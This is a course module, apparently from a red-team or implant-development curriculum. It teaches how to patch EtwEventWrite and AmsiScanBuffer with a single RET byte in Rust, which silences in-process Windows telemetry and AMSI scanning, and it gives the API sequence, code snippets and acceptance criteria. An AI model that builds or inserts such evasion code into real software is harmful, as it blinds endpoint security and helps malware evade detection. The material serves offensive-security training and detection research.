# Module 11 — ETW & AMSI Patching

## Concept

Modern Windows has two in-process telemetry mechanisms that security products depend on:

**ETW — Event Tracing for Windows**
Every significant Win32 API call (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, etc.) fires an event through `EtwEventWrite` in ntdll.dll. These events are consumed by the kernel's ETW infrastructure, which feeds data to EDR products, security event logs, and Sysmon. If `EtwEventWrite` returns immediately without doing anything, all these events disappear silently.

**AMSI — Anti-Malware Scan Interface**
`AmsiScanBuffer` in `amsi.dll` is called by the PowerShell engine, the .NET CLR, and other script hosts before executing any script content. It passes the content to registered security providers (Windows Defender, etc.) and returns a verdict. If the function returns immediately, every scan returns `AMSI_RESULT_CLEAN` regardless of content.

### The patch

Both functions receive the same treatment: overwrite the first byte of the function with `0xC3` — the x64 `RET` instruction. The function then immediately returns to its caller with whatever value happened to be in `rax`, which is treated as a success code.

```
before:
  EtwEventWrite:  4C 8B DC   mov r11, rsp
                  49 89 5B 08 mov [r11+8], rbx
                  ...

after:
  EtwEventWrite:  C3          ret   ← returns immediately, no telemetry
                  49 89 5B 08 (unreachable)
```

### Why only one byte?

The three-byte prologue of most functions starts with a `mov` whose first byte is not `0xC3`, so a single-byte overwrite is sufficient and minimal. Patching just one byte minimizes the write window and reduces the chance of a race with a concurrent caller.

### Scope

These patches are **per-process**. They only affect telemetry from the current process. They do not disable system-wide ETW or AMSI — only the in-process instances. This makes them useful in an implant that patches itself early in execution.

**Important:** AMSI must be patched **before** any script engine initializes. For this exercise we patch both immediately at startup — in a real implant the AMSI patch would come first, before loading any .NET or PowerShell runtime.

### Compare with Module 10

| | API Unhooking (module 10) | ETW/AMSI Patching (this module) |
|---|---|---|
| Target | EDR hooks in ntdll `.text` section | Telemetry functions (EtwEventWrite, AmsiScanBuffer) |
| Effect | Restores hooks so calls go unmonitored | Silences telemetry sources entirely |
| Scope | Any ntdll stub | Two specific functions |
| Reversibility | Yes — clean bytes are restored | Not reversed (function is permanently broken in-process) |

---

## The patching sequence

1. `GetModuleHandleA("ntdll.dll")` — get the already-loaded ntdll handle.
2. `GetProcAddress(ntdll, "EtwEventWrite")` — resolve the function address.
3. `VirtualProtect` → write `0xC3` → `VirtualProtect` restore.
4. `LoadLibraryA("amsi.dll")` — amsi.dll may not yet be loaded.
5. `GetProcAddress(amsi, "AmsiScanBuffer")` — resolve the function address.
6. `VirtualProtect` → write `0xC3` → `VirtualProtect` restore.
7. Demonstrate: call a Win32 API to trigger ETW events; observe no crash.

---

## Task

Implement the patcher in `src/main.rs`. The skeleton has `todo!()` stubs for each step with hints.

### Step 1 — Get ntdll handle

```
GetModuleHandleA(
    lpmodulename: PCSTR,  // b"ntdll.dll\0" — the DLL is always loaded; this cannot fail
) -> Result<HMODULE>      // HMODULE.0 as usize == the DLL's load address
```

`GetModuleHandleA` does **not** call `LoadLibrary` and does **not** increment the reference count. You must not call `FreeLibrary` on the result. Use it only as an argument to `GetProcAddress`.

### Step 2 — Resolve EtwEventWrite

```
GetProcAddress(
    hmodule: HMODULE,     // handle from step 1
    lpprocname: PCSTR,    // b"EtwEventWrite\0" — exact export name, case-sensitive
) -> Option<unsafe extern "system" fn() -> isize>
                          // None if the export is not found (shouldn't happen for ntdll)
```

The return type is a generic function pointer. You need to cast it to `*mut u8` to patch the first byte:

```rust
let fn_ptr: *mut u8 = std::mem::transmute(proc_addr.unwrap());
```

Or more explicitly (if the Option branch is already unwrapped):

```rust
let fn_ptr = proc_addr.unwrap() as usize as *mut u8;
```

### Step 3 — Apply the ETW patch

The patch pattern is always three steps:

**3a — Unlock the page:**
```
VirtualProtect(
    lpaddress: *const c_void,              // fn_ptr as *const c_void
    dwsize: usize,                         // 1 — we only touch one byte
    flnewprotect: PAGE_PROTECTION_FLAGS,   // PAGE_EXECUTE_READWRITE — add write permission
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // out: original protection flags, needed for restore
) -> Result<()>
```

**3b — Write the patch:**
```rust
unsafe { *fn_ptr = 0xC3u8; }  // x64 RET instruction
```

**3c — Restore protection:**
```rust
VirtualProtect(fn_ptr as *const c_void, 1, old_protect, &mut old_protect)?;
```

Always restore the original protection. Code pages should be `PAGE_EXECUTE_READ` at rest — leaving them as `PAGE_EXECUTE_READWRITE` is a detectable anomaly.

### Step 4 — Load amsi.dll

```
LoadLibraryA(
    lplibfilename: PCSTR,  // b"amsi.dll\0"
) -> Result<HMODULE>       // Err if the DLL is not found (should always succeed on Windows 10+)
```

Unlike ntdll, amsi.dll is not loaded in every process by default. `LoadLibraryA` loads it if not already present and returns a handle. This handle IS reference-counted — you could call `FreeLibrary` on it, but for this exercise it's fine to leave it loaded.

### Step 5 — Resolve AmsiScanBuffer

```
GetProcAddress(
    hmodule: HMODULE,     // hamsi from step 4
    lpprocname: PCSTR,    // b"AmsiScanBuffer\0"
) -> Option<unsafe extern "system" fn() -> isize>
```

### Step 6 — Apply the AMSI patch

Same three-step pattern as step 3: `VirtualProtect` → write `0xC3` → `VirtualProtect` restore.

### Step 7 — Demonstrate

Call `VirtualAlloc` and `VirtualFree`. These allocation operations would normally trigger several `EtwEventWrite` calls inside ntdll. With the patch applied, those calls return immediately instead of writing events. The allocation itself still works — you've only silenced the telemetry, not the functionality.

Print a message confirming the allocation succeeded without crashing.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p etw-amsi` succeeds
- [ ] On the VM, the binary prints the addresses of `EtwEventWrite` and `AmsiScanBuffer`
- [ ] First byte before each patch is printed (should be `0x4c` for ETW write, varies for AMSI)
- [ ] First byte after each patch is `0xc3`
- [ ] The demonstration allocation (step 7) completes without crashing
- [ ] `VirtualProtect` return value is checked (use `?` or `.unwrap()`) before writing
- [ ] Protection is restored after each patch (not left as `PAGE_EXECUTE_READWRITE`)
- [ ] `GetProcAddress` `None` return is handled (not silently unwrapped without a message)

---

## Key Types

**`HMODULE`** — from `Win32_Foundation`. A handle to a loaded DLL. Its numeric value (`hmod.0 as usize`) equals the DLL's base address. Do not confuse with `HANDLE` (which is for kernel objects like files and processes).

**`PAGE_PROTECTION_FLAGS`** — a newtype wrapper around `u32`. Common values:
- `PAGE_EXECUTE_READ` — normal protection for code pages
- `PAGE_EXECUTE_READWRITE` — allows writes to code pages (temporarily needed to patch)
- `PAGE_READWRITE` — for data pages with no execute

**`PCSTR`** — a null-terminated ANSI string pointer. The `windows` crate provides `PCSTR::null()` for a null pointer, and you can construct one from a byte literal: `PCSTR::from_raw(b"amsi.dll\0".as_ptr())` or by passing `b"amsi.dll\0"` directly where the API expects `impl Into<PCSTR>`.

---

## Hints

- Read the first byte before and after patching — a before value of `0xC3` would mean the function was already patched (or your pointer is wrong).
- `GetProcAddress` returns an `Option`. If it's `None`, the export name is wrong — double-check spelling and casing (`EtwEventWrite`, not `EtwWriteEvent`).
- The `transmute` from `Option<fn>` to `*mut u8` is the idiomatic way to get a mutable byte pointer to a function. The alternative (`fn_addr as usize as *mut u8`) works if you unwrap the `Option` first.
- If `VirtualProtect` fails with `ERROR_INVALID_ADDRESS`, your pointer is probably pointing to the disk-mapped copy or is miscomputed. Print `fn_ptr as usize` and compare it to `GetModuleHandleA("ntdll.dll").0 as usize` — the ETW address should be above the module base.
- This module directly complements module 10. A real loader would typically unhook ntdll (module 10) AND patch ETW/AMSI (this module) before doing anything else.

---

## Submission

Paste `11-etw-amsi/src/main.rs` and ask for a review.
